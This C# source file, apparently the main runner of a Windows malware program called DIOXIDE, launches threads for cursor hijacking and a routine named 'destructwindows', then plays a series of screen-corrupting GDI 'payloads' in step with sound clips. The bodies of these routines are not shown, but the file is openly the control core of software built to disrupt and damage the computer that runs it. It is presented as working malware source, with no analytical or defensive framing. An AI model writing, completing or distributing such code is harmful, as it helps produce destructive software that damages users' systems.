using System;
using System.Threading;

namespace DIOXIDE
{
    class run_payloads
    {
        public static void Start()
        {
            Win32API.SetProcessDPIAware();

            int True = 1;

            payloads payloads = new payloads();
            destruction destruction = new destruction();

            new Thread(new ThreadStart(payloads.cursor_movement)).Start();
            new Thread(new ThreadStart(destruction.destructwindows)).Start();

            new Thread(new ThreadStart(payloads.gdi1)).Start();
            payloads.Sound1();
            payloads.gdi1_cancel = True;

            new Thread(new ThreadStart(payloads.gdi2)).Start();
            payloads.Sound2();
            payloads.gdi2_cancel = True;

            new Thread(new ThreadStart(payloads.gdi3)).Start();
            payloads.Sound3();
            payloads.gdi3_cancel = True;

            Win32API.ReleaseDC(payloads.hwnd, payloads.hdc);
            new Thread(new ThreadStart(payloads.gdi2)).Start();
            new Thread(new ThreadStart(payloads.gdi3)).Start();
            payloads.Sound4();
            payloads.gdi2_cancel = True;
            payloads.gdi3_cancel = True;

            new Thread(new ThreadStart(payloads.gdi4)).Start();
            payloads.Sound5();
            payloads.gdi4_cancel = True;

            new Thread(new ThreadStart(payloads.gdi5)).Start();
            payloads.Sound6();
            payloads.gdi5_cancel = True;
            payloads.cursor_movement_cancel = True;

            return;
        }
    }
}
